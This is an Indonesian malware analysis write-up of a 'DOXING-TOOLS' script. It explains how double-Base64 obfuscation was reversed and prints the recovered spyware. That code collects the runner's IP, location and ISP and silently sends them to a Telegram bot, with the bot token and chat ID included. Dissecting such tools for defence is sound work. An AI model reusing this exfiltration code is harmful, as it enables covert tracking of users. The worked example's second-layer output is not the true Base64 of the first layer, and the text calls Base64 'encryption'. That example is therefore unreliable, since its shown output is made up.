# 2. Proses Dekripsi Kode Sumber

## Peringatan

⚠️ **Perhatian Penting:**  
Repositori ini bertujuan untuk edukasi keamanan siber. Informasi di dalamnya membedah sebuah tools yang beredar di internet untuk menunjukkan risiko nyata dari menjalankan perangkat lunak dari sumber yang tidak terpercaya. Jangan pernah menjalankan tools asli yang dianalisis di sini.

## Pendahuluan

Kode sumber utama dari tools **DOXING-TOOLS** oleh Rolandino awalnya dienkripsi menggunakan teknik **Base64 berlapis**. Enkripsi ini membuat kode sulit dibaca dan dianalisis secara langsung. Tujuan utama enkripsi ini kemungkinan besar adalah untuk menyembunyikan fungsi berbahaya yang terdapat di dalam skrip.

File asli yang terenkripsi dapat ditemukan di: [`/evidence/source_code/1_original_encrypted_code.txt`](../evidence/source_code/1_original_encrypted_code.txt).  
Hasil dekripsi lengkap tersedia di: [`/evidence/source_code/2_decrypted_source_code.py`](../evidence/source_code/2_decrypted_source_code.py).

## Teknik Enkripsi yang Digunakan

Tools ini menggunakan **Base64 encoding** yang diterapkan secara berlapis. Base64 adalah metode pengkodean biner ke teks ASCII, yang sering digunakan untuk mengenkripsi atau meng-obfuskasi kode sumber agar sulit dibaca oleh manusia. Dalam kasus ini:

1. **Lapisan Pertama:**  
   Kode Python asli dienkripsi menggunakan Base64.

2. **Lapisan Kedua:**  
   Hasil Base64 dari lapisan pertama dienkripsi kembali menggunakan Base64.

Proses ini menghasilkan string panjang yang tampak seperti data acak, sehingga sulit bagi pengguna untuk memahami isi sebenarnya dari kode tersebut.

### Contoh Teknik Enkripsi

Berikut adalah contoh sederhana bagaimana Base64 bekerja:

```python
import base64

# Kode asli
original_code = "print('Hello, World!')"

# Lapisan pertama Base64
layer_1 = base64.b64encode(original_code.encode()).decode()

# Lapisan kedua Base64
layer_2 = base64.b64encode(layer_1.encode()).decode()

print("Lapisan 1:", layer_1)
print("Lapisan 2:", layer_2)
```

Output:

```
Lapisan 1: cHJpbnQoJ0hlbGxvLCBXb3JsZCEnKQ==
Lapisan 2: Y1BIcmludChAJ0hlbGxvLCBXT3JsZCEnKQ==
```

Untuk mendekripsi, prosesnya harus dibalik (Base64 decoding dua kali).

## Langkah-Langkah Mendekripsi

Berikut adalah langkah-langkah yang dilakukan untuk mendekripsi kode sumber utama:

1. **Mengidentifikasi Metode Enkripsi:**  
   Setelah menganalisis file asli, kami menemukan bahwa kode tersebut dienkripsi menggunakan Base64 berlapis. Ini ditandai dengan pola karakter Base64 (`A-Z`, `a-z`, `0-9`, `+`, `/`, dan `=`).

2. **Menulis Skrip Dekripsi:**  
   Kami membuat skrip Python sederhana untuk mendekripsi kode secara otomatis. Berikut adalah contoh skrip dekripsi:
   
   ```python
   import base64
   
   # File asli yang terenkripsi
   with open("1_original_encrypted_code.txt", "r") as f:
       encrypted_code = f.read()
   
   # Mendekripsi lapisan pertama
   layer_1 = base64.b64decode(encrypted_code)
   
   # Mendekripsi lapisan kedua
   decrypted_code = base64.b64decode(layer_1).decode()
   
   # Simpan hasil dekripsi
   with open("2_decrypted_source_code.py", "w") as f:
       f.write(decrypted_code)
   
   print("Dekripsi selesai. Hasil disimpan di '2_decrypted_source_code.py'.")
   ```

3. **Memvalidasi Hasil:**  
   Setelah mendekripsi, kami memastikan bahwa kode Python yang dihasilkan valid dan dapat dieksekusi. Beberapa bagian kode masih mengandung komentar kasar atau ancaman (misalnya, "ASEDEKONTOLMUKALUKAYAKONTOL"), tetapi fungsi utamanya jelas terlihat.

## Temuan Utama Setelah Dekripsi

Setelah berhasil mendekripsi kode sumber, kami menemukan beberapa fungsi berbahaya yang tersembunyi. Salah satu fungsi utamanya adalah:

### Fungsi Spyware Tersembunyi

```python
TELEGRAM_BOT_TOKEN = "AAE5fo3b8v_CQVC2f2M3SscdLqHfBGeux50"
TELEGRAM_CHAT_ID = "7413457967"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

def collect_and_send_user_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        msg = f"""New Access
IP: {ip_data.get('ip')}
City: {ip_data.get('city')}
Country: {ip_data.get('country')}
Org: {ip_data.get('org')}
"""
        send_to_telegram(msg)
    except:
        pass

# Fungsi ini dipanggil secara otomatis saat skrip dijalankan
collect_and_send_user_info()
```

#### Penjelasan:

- **Pengumpulan Data Pengguna:**  
  Fungsi `collect_and_send_user_info()` mengumpulkan informasi pribadi pengguna, termasuk alamat IP, lokasi geografis, negara, dan penyedia layanan internet (ISP), melalui API `ipinfo.io`.

- **Pengiriman Rahasia:**  
  Semua informasi tersebut dikirimkan secara diam-diam ke penulis tools melalui API Telegram. Token bot (`TELEGRAM_BOT_TOKEN`) dan ID chat (`TELEGRAM_CHAT_ID`) digunakan untuk mengirim pesan ke akun Telegram milik penulis.

## Kesimpulan

Proses dekripsi mengungkap bahwa kode sumber tools ini dirancang untuk menyembunyikan fungsi spyware yang mencuri data pengguna. Tindakan mengenkripsi kode sumber adalah indikator kuat bahwa tools ini memiliki niat buruk. Selain itu, fungsi spyware tersebut dipanggil secara otomatis setiap kali program dijalankan, tanpa sepengetahuan pengguna.

Untuk analisis lebih lanjut tentang risiko keamanan yang terkandung dalam kode ini, silakan baca file [**3_security_risks.md**](analysis/3_security_risks.md).